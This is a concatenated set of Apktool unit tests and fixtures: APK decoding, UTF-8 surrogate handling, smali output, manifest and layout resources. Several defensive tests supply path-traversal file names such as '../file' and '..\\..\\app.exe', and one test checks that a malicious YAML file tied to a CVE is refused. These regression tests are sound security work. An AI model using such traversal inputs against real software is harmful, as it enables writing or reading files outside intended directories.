        File file = new File(sTmpDir, "pip_dismiss_scrim.9.png");
        return new FileInputStream(file.toPath().toString());
    }

    private static final int NP_COLOR = 0xff000000;
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/decode/MissingVersionManifestTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.decode;

import brut.androlib.Androlib;
import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.androlib.meta.MetaInfo;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.io.IOException;

import static org.junit.Assert.assertNull;

public class MissingVersionManifestTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(MissingVersionManifestTest.class, "decode/issue1264/", sTmpDir);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void missingVersionParsesCorrectlyTest() throws BrutException, IOException {
        String apk = "issue1264.apk";

        // decode issue1264.apk
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + apk));
        ExtFile decodedApk = new ExtFile(sTmpDir + File.separator + apk + ".out");
        apkDecoder.setOutDir(new File(sTmpDir + File.separator + apk + ".out"));
        apkDecoder.decode();

        MetaInfo metaInfo = new Androlib().readMetaFile(decodedApk);
        assertNull(metaInfo.versionInfo.versionName);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/decode/OutsideOfDirectoryEntryTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.decode;

import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;

import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;

public class OutsideOfDirectoryEntryTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(OutsideOfDirectoryEntryTest.class, "decode/issue1589/", sTmpDir);

        String apk = "issue1589.apk";

        // decode issue1589.apk
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + apk));
        sTestNewDir = new ExtFile(sTmpDir + File.separator + apk + ".out");

        apkDecoder.setOutDir(new File(sTmpDir + File.separator + apk + ".out"));
        apkDecoder.decode();
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void skippedDecodingOfInvalidFileTest() {
        assertTrue(sTestNewDir.isDirectory());

        File testAssetFolder = new File(sTestNewDir, "assets");
        assertFalse(testAssetFolder.isDirectory());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/decode/ParentDirectoryTraversalTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.decode;

import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.io.IOException;

public class ParentDirectoryTraversalTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(ParentDirectoryTraversalTest.class, "decode/issue1498/", sTmpDir);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void checkIfDrawableFileDecodesProperly() throws BrutException, IOException {
        String apk = "issue1498.apk";

        // decode issue1498.apk
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + apk));
        apkDecoder.setDecodeResources(ApkDecoder.DECODE_RESOURCES_NONE);

        apkDecoder.setOutDir(new File(sTmpDir + File.separator + apk + ".out"));

        // this should not raise an exception:
        apkDecoder.decode();
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/decode/VectorDrawableTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.decode;

import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.io.IOException;

import static org.junit.Assert.assertTrue;

public class VectorDrawableTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(VectorDrawableTest.class, "decode/issue1456/", sTmpDir);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void checkIfDrawableFileDecodesProperly() throws BrutException, IOException {
        String apk = "issue1456.apk";

        // decode issue1456.apk
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + apk));
        sTestOrigDir = new ExtFile(sTmpDir + File.separator + apk + ".out");

        apkDecoder.setOutDir(new File(sTmpDir + File.separator + apk + ".out"));
        apkDecoder.decode();

        checkFileExists("res/drawable/ic_arrow_drop_down_black_24dp.xml");
        checkFileExists("res/drawable/ic_android_black_24dp.xml");
    }

    private void checkFileExists(String path) {
        File f =  new File(sTestOrigDir, path);

        assertTrue(f.isFile());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/encoders/PositionalEnumerationTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.encoders;

import brut.androlib.BaseTest;
import brut.androlib.res.xml.ResXmlEncoders;
import org.junit.Test;

import static org.junit.Assert.assertEquals;

public class PositionalEnumerationTest extends BaseTest {

    @Test
    public void noArgumentsTest() {
        assertEquals("test", enumerateArguments("test"));
    }

    @Test
    public void twoArgumentsTest() {
        assertEquals("%1$s, %2$s, and 1 other.", enumerateArguments("%s, %s, and 1 other."));
    }

    @Test
    public void twoPositionalArgumentsTest() {
        assertEquals("%1$s, %2$s and 1 other", enumerateArguments("%1$s, %2$s and 1 other"));
    }

    @Test
    public void threeArgumentsTest() {
        assertEquals("%1$s, %2$s, and %3$d other.", enumerateArguments("%s, %s, and %d other."));
    }

    @Test
    public void threePositionalArgumentsTest() {
        assertEquals(" %1$s, %2$s and %3$d other", enumerateArguments(" %1$s, %2$s and %3$d other"));
    }

    @Test
    public void fourArgumentsTest() {
        assertEquals("%1$s, %2$s, and %3$d other and %4$d.", enumerateArguments("%s, %s, and %d other and %d."));
    }

    @Test
    public void fourPositionalArgumentsTest() {
        assertEquals(" %1$s, %2$s and %3$d other and %4$d.", enumerateArguments(" %1$s, %2$s and %3$d other and %4$d."));
    }

    private String enumerateArguments(String value) {
        return ResXmlEncoders.enumerateNonPositionalSubstitutionsIfRequired(value);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/res/decoder/StringBlockWithSurrogatePairInUtf8Test.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import org.junit.Test;

import java.nio.charset.StandardCharsets;

import static org.junit.Assert.assertEquals;

public class StringBlockWithSurrogatePairInUtf8Test {
    @Test
    public void decodeSingleOctet() {
        final String actual = new StringBlock("abcDEF123".getBytes(StandardCharsets.UTF_8), true).decodeString(0, 9);
        assertEquals("Incorrect decoding", "abcDEF123", actual);
    }

    @Test
    public void decodeTwoOctets() {
        final String actual0 = new StringBlock(new byte[] {	(byte) 0xC2, (byte) 0x80}, true).decodeString(0, 2);
        assertEquals("Incorrect decoding", "\u0080", actual0);

        final String actual1 = new StringBlock(new byte[] {	(byte) 0xDF, (byte) 0xBF}, true).decodeString(0, 2);
        assertEquals("Incorrect decoding", "\u07FF", actual1);
    }

    @Test
    public void decodeThreeOctets() {
        final String actual0 = new StringBlock(new byte[] {	(byte) 0xE0, (byte) 0xA0, (byte) 0x80}, true).decodeString(0, 3);
        assertEquals("Incorrect decoding", "\u0800", actual0);

        final String actual1 = new StringBlock(new byte[] {	(byte) 0xEF, (byte) 0xBF, (byte) 0xBF}, true).decodeString(0, 3);
        assertEquals("Incorrect decoding", "\uFFFF", actual1);
    }

    @Test
    public void decodeSurrogatePair_when_givesAsThreeOctetsFromInvalidRangeOfUtf8() {
        // See: https://github.com/iBotPeaches/Apktool/issues/2299
        final String actual = new StringBlock(new byte[] {	(byte) 0xED, (byte) 0xA0, (byte) 0xBD, (byte) 0xED, (byte) 0xB4, (byte) 0x86}, true).decodeString(0, 6);
        assertEquals("Incorrect decoding", "\uD83D\uDD06", actual);

        // See: https://github.com/iBotPeaches/Apktool/issues/2546
        final byte[] bytesWithCharactersBeforeSurrogatePair = {'G', 'o', 'o', 'd', ' ', 'm', 'o', 'r', 'n', 'i', 'n', 'g', '!', ' ',
                (byte) 0xED, (byte) 0xA0, (byte) 0xBD, (byte) 0xED, (byte) 0xB1, (byte) 0x8B,
                ' ', 'S', 'u', 'n', ' ',
                (byte) 0xED, (byte) 0xA0, (byte) 0xBC, (byte) 0xED, (byte) 0xBC, (byte) 0x9E
        };
        final String actual2 = new StringBlock(bytesWithCharactersBeforeSurrogatePair, true).decodeString(0, 31);

        // D83D -> 0xED 0xA0 0xBD
        // DC4B -> 0xED 0xB1 0x8B
        // D83C -> 0xED 0xA0 0xBC
        // DF1E -> 0xED 0xBC 0x9E
        assertEquals("Incorrect decoding when there are valid characters before the surrogate pair",
                "Good morning! \uD83D\uDC4B Sun \uD83C\uDF1E", actual2);
    }

    @Test
    public void decodeSurrogatePair_when_givesAsThreeOctetsFromTheValidRangeOfUtf8() {
        // \u10FFFF is encoded in UTF-8 as "0xDBFF 0xDFFF" (4-byte encoding),
        // but when used in Android resources which are encoded in UTF-8, 3-byte encoding is used,
        // so each of these is encoded as 3-bytes
        final String actual = new StringBlock(new byte[] {	(byte) 0xED, (byte) 0xAF, (byte) 0xBF, (byte) 0xED, (byte) 0xBF, (byte) 0xBF}, true).decodeString(0, 6);
        assertEquals("Incorrect decoding", "\uDBFF\uDFFF", actual);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/res/src/DexStaticFieldValueTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.src;

import brut.androlib.*;
import brut.androlib.aapt2.BuildAndDecodeTest;
import brut.androlib.options.BuildOptions;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

import static org.junit.Assert.assertEquals;

public class DexStaticFieldValueTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();

        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTestOrigDir = new ExtFile(sTmpDir, "issue2543-orig");
        sTestNewDir = new ExtFile(sTmpDir, "issue2543-new");
        LOGGER.info("Unpacking issue2543...");
        TestUtils.copyResourceDir(BuildAndDecodeTest.class, "decode/issue2543/", sTestOrigDir);

        BuildOptions buildOptions = new BuildOptions();

        LOGGER.info("Building issue2543.apk...");
        File testApk = new File(sTmpDir, "issue2543.apk");
        new Androlib(buildOptions).build(sTestOrigDir, testApk);

        LOGGER.info("Decoding issue2543.apk...");
        ApkDecoder apkDecoder = new ApkDecoder(testApk);
        apkDecoder.setOutDir(sTestNewDir);
        apkDecoder.setBaksmaliDebugMode(false);
        apkDecoder.decode();
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void disassembleDexFileToKeepDefaultParameters() throws IOException {
        String expected = TestUtils.replaceNewlines(
                ".class public LHelloWorld;\n"
                        + ".super Ljava/lang/Object;\n"
                        + "\n"
                        + "\n"
                        + "# static fields\n"
                        + ".field private static b:Z = false\n"
                        + "\n"
                        + ".field private static c:Z = true\n"
                        + "\n"
                        + "\n"
                        + "# direct methods\n"
                        + ".method public static main([Ljava/lang/String;)V\n"
                        + "    .locals 1\n"
                        + "\n"
                        + "    return-void\n"
                        + ".end method");

        byte[] encoded = Files.readAllBytes(Paths.get(sTestNewDir + File.separator + "smali" + File.separator
            + "HelloWorld.smali"));

        String obtained = TestUtils.replaceNewlines(new String(encoded));
        assertEquals(expected, obtained);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/util/AaptVersionTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.util;

import brut.common.BrutException;
import brut.util.AaptManager;
import org.junit.Test;

import static org.junit.Assert.assertEquals;

public class AaptVersionTest {

    @Test
    public void testAapt2Iterations() throws BrutException {
        assertEquals(2, AaptManager.getAppVersionFromString("Android Asset Packaging Tool (aapt) 2:17"));
        assertEquals(2, AaptManager.getAppVersionFromString("Android Asset Packaging Tool (aapt) 2.17"));
        assertEquals(1, AaptManager.getAppVersionFromString("Android Asset Packaging Tool, v0.9"));
        assertEquals(1, AaptManager.getAppVersionFromString("Android Asset Packaging Tool, v0.2-2679779"));
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/util/UnknownDirectoryTraversalTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.util;

import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.common.BrutException;
import brut.common.InvalidUnknownFileException;
import brut.common.RootUnknownFileException;
import brut.common.TraversalUnknownFileException;
import brut.directory.ExtFile;
import brut.util.BrutIO;
import brut.util.OS;
import brut.util.OSDetection;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.io.IOException;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;

public class UnknownDirectoryTraversalTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(UnknownDirectoryTraversalTest.class, "util/traversal", sTmpDir);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void validFileTest() throws IOException, BrutException {
        String validFilename = BrutIO.sanitizeUnknownFile(sTmpDir, "file");
        assertEquals(validFilename, "file");

        File validFile = new File(sTmpDir, validFilename);
        assertTrue(validFile.isFile());
    }

    @Test(expected = TraversalUnknownFileException.class)
    public void invalidBackwardFileTest() throws IOException, BrutException {
        BrutIO.sanitizeUnknownFile(sTmpDir, "../file");
    }

    @Test(expected = RootUnknownFileException.class)
    public void invalidRootFileTest() throws IOException, BrutException {
        String rootLocation = OSDetection.isWindows() ? "C:/" : File.separator;
        BrutIO.sanitizeUnknownFile(sTmpDir, rootLocation + "file");
    }

    @Test(expected = InvalidUnknownFileException.class)
    public void noFilePassedTest() throws IOException, BrutException {
        BrutIO.sanitizeUnknownFile(sTmpDir, "");
    }

    @Test(expected = TraversalUnknownFileException.class)
    public void invalidBackwardPathOnWindows() throws IOException, BrutException {
        String invalidPath;
        if (! OSDetection.isWindows()) {
            invalidPath = "../../app";
        } else {
            invalidPath = "..\\..\\app.exe";
        }

        BrutIO.sanitizeUnknownFile(sTmpDir, invalidPath);
    }

    @Test
    public void validDirectoryFileTest() throws IOException, BrutException {
        String validFilename = BrutIO.sanitizeUnknownFile(sTmpDir, "dir" + File.separator + "file");
        assertEquals("dir" + File.separator + "file", validFilename);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/yaml/MaliciousYamlTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.yaml;

import brut.androlib.Androlib;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.androlib.options.BuildOptions;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.junit.BeforeClass;
import org.junit.Test;
import org.yaml.snakeyaml.constructor.ConstructorException;

import java.io.File;

public class MaliciousYamlTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();

        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTestNewDir = new ExtFile(sTmpDir, "cve20220476");
        LOGGER.info("Unpacking cve20220476...");
        TestUtils.copyResourceDir(MaliciousYamlTest.class, "yaml/cve20220476/", sTestNewDir);
    }

    @Test(expected = ConstructorException.class)
    public void testMaliciousYamlNotLoaded() throws BrutException {
        BuildOptions buildOptions = new BuildOptions();
        File testApk = new File(sTmpDir, "cve20220476.apk");
        new Androlib(buildOptions).build(sTestNewDir, testApk);
    }
}

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/issue1235/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest package="com.ibotpeaches.issue1235" xmlns:android="http://schemas.android.com/apk/res/android" platformBuildVersionCode="20" platformBuildVersionName="4.4W.2-1537038">
<application android:debuggable="false"/>
</manifest>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/issue1235/apktool.yml`:

```yml
version: 2.0.0
apkFileName: issue1235.apk
isFrameworkApk: false
usesFramework:
  ids:
  - 1
packageInfo:
  forcedPackageId: '127'
versionInfo:
  versionCode: '1'
  versionName: '1.0'
compressionType: false
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/issue1235/res/values/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/issue1481/apktool.yml`:

```yml
version: 2.2.3
apkFileName: issue1481.jar
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/issue1481/smali/com/ibotpeaches/issue1481/BuildConfig.smali`:

```smali
.class public final Lcom/ibotpeaches/issue1481/BuildConfig;
.super Ljava/lang/Object;
.source "BuildConfig.java"


# static fields
.field public static final APPLICATION_ID:Ljava/lang/String; = "com.ibotpeaches.issue1481"

.field public static final BUILD_TYPE:Ljava/lang/String; = "debug"

.field public static final DEBUG:Z

.field public static final FLAVOR:Ljava/lang/String; = ""

.field public static final VERSION_CODE:I = 0x1

.field public static final VERSION_NAME:Ljava/lang/String; = "1.0"


# direct methods
.method static constructor <clinit>()V
    .registers 1

    .prologue
    .line 7
    const-string v0, "true"

    invoke-static {v0}, Ljava/lang/Boolean;->parseBoolean(Ljava/lang/String;)Z

    move-result v0

    sput-boolean v0, Lcom/ibotpeaches/issue1481/BuildConfig;->DEBUG:Z

    return-void
.end method

.method public constructor <init>()V
    .registers 1

    .prologue
    .line 6
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:appCategory="game" android:compileSdkVersion="23" android:compileSdkVersionCodename="6.0-2438415" package="brut.apktool.testapp" platformBuildVersionCode="23" platformBuildVersionName="6.0-2438415">
    <uses-feature android:glEsVersion="0x00020000" />
    <uses-feature android:glEsVersion="0x00030002" />
    <application android:label="Issue2799 &amp; B">
        <meta-data name="test_int_as_string" value="\ 12345" />
        <meta-data name="test_int" value="12345" />
    </application>
</manifest>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/apktool.yml`:

```yml
version: 2.0.0
apkFileName: testapp.apk
isFrameworkApk: false
usesFramework:
  ids:
  - 1
packageInfo:
  forcedPackageId: '127'
versionInfo:
  versionCode: '1'
  versionName: '1.0'
compressionType: false
doNotCompress:
- assets/0byte_file.jpg
- arsc
- png
- mp3
unknownFiles:
  hidden.file: '8'
  non\u007Fprintable.file: '8'
  stored.file: '0'
  unk_folder/unknown_file: '8'
  lib_bug603/bug603: '8'
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/assets/txt/no-unicode.txt`:

```txt
This is an empty file.
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/assets/unicode-txt/∂-unicode.txt`:

```txt
∂ char.
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/font/lobster.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<font-family xmlns:android="http://schemas.android.com/apk/res/android">
    <font
        android:fontStyle="normal"
        android:fontWeight="400"
        android:font="@font/lobster_regular" />
</font-family>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/layout/issue1040.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<TextView
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:gravity="@integer/reference_test"
    />
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/layout/issue1063.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:custom="http://schemas.android.com/apk/res-auto">
    <TextView custom:test_attr11="TEST_ONE" />
    <TextView custom:test_attr11="TEST_ZERO" />
</LinearLayout>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/layout/issue1130.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android">
    <TableLayout android:shrinkColumns="1" />
    <TableLayout android:shrinkColumns="\ 2147483647" />
    <TableLayout android:shrinkColumns="\ 2147483648" />
    <TableLayout android:shrinkColumns="\ 555555555555555555" />
</LinearLayout>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/layout/issue1157.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<PreferenceScreen android:title="test" app:min_value="0.2" app:max_value="5.0" app:default_value="1.0"
        xmlns:android="http://schemas.android.com/apk/res/android"
        xmlns:app="http://schemas.android.com/apk/res/brut.apktool.testapp" />
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/layout/issue1274.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent">
</LinearLayout>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/layout/issue1674.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<TextView xmlns:android="http://schemas.android.com/apk/res/android" android:autoSizeTextType="uniform" />
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/raw/no_extension`:

```
This file has no extension.
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-ar-rXB/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">"‏‮Forgot‬‏ ‏‮your‬‏ ‏‮username‬‏ ‏‮or‬‏ ‏‮password?‬‏\n‏‮Visit‬‏ ‏‮google.com/accounts/recover‬‏‏‮y‬‏‏‮.‬‏"</string>
    <string name="test2">‏‮Forgot‬‏ ‏‮your‬‏ ‏‮username‬‏ ‏‮or‬‏ ‏‮password?‬\n.‏‮Visit‬‏ ‏‮google.com/accounts/recover‬‏‏‮y‬‏</string>
    <string name="test3">          (string8) "‏‮Forgot‬‏ ‏‮your‬‏ ‏‮username‬‏ ‏‮or‬‏ ‏‮password?‬‏\n‏‮Visit‬‏ ‏‮google.com/accounts/recover‬‏‏‮y‬‏‏‮.‬‏"</string>
    <string name="test4">Forgot your username or password?\nVisit google.com/accounts/recovery.</string>
    <string name="test5">‏‮Forgot‬‏ ‏‮your‬‏ ‏‮username‬‏ ‏‮or‬‏ ‏‮password?‬‏
        ‏‮Visit‬‏ ‏‮google.com/accounts/recover‬‏‏‮y‬‏‏‮.‬‏</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-ast-rES/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-ast/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

